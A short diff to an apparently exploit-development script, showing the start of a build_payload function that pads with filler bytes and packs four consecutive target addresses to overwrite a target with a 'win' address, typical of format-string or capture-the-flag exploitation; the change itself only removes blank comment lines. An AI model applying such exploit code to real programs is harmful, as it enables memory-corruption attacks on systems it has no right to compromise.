@@ -1,7 +1,5 @@
 # overwrites 'target', with 'win'.
 # 
-# 
-# 
 def build_payload(win, target, offset, padding):
     payload = b"A" * padding
     payload += p32(target + 0) + p32(target + 1) + p32(target + 2) + p32(target + 3)
